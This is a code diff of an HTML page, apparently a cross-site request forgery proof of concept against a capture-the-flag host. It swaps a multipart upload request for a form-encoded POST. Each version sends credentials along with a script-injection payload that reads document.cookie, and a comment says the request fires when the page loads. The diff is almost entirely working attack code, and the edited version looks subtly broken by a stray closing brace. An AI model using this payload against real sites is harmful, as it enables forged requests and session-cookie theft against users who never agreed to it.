@@ -3,25 +3,19 @@
   <body>
     <script>
       function submitRequest() {
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "http://ctf.widyasecurity.com/upload", true);
-        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8");
-        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
-        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------3127818317903525902053301505");
-        xhr.withCredentials = true;
-        
-        var body = "-----------------------------3127818317903525902053301505\r\n" + 
-          "Content-Disposition: form-data; name=\"qrcode\"; filename=\"firza.png\"\r\n" + 
-          "Content-Type: image/png\r\n" + 
-          "\r\n" + 
-          "</script><script>alert(document.cookie)</script>\r\n" + 
-          "-----------------------------3127818317903525902053301505--\r\n";
-        
-        var aBody = new Uint8Array(body.length);
-        for (var i = 0; i < aBody.length; i++)
-          aBody[i] = body.charCodeAt(i); 
-        
-        xhr.send(new Blob([aBody]));
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "http://ctf.widyasecurity.com/upload", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.withCredentials = true;
+
+  var payload = "</script><script>alert(document.cookie)</script>";
+  var encodedPayload = encodeURIComponent(payload);
+
+  var formData = "searchFor=" + encodedPayload + "&goButton=";
+
+  xhr.send(formData);
+}
+
       }
       
       // Automatically submit the request when the page loads
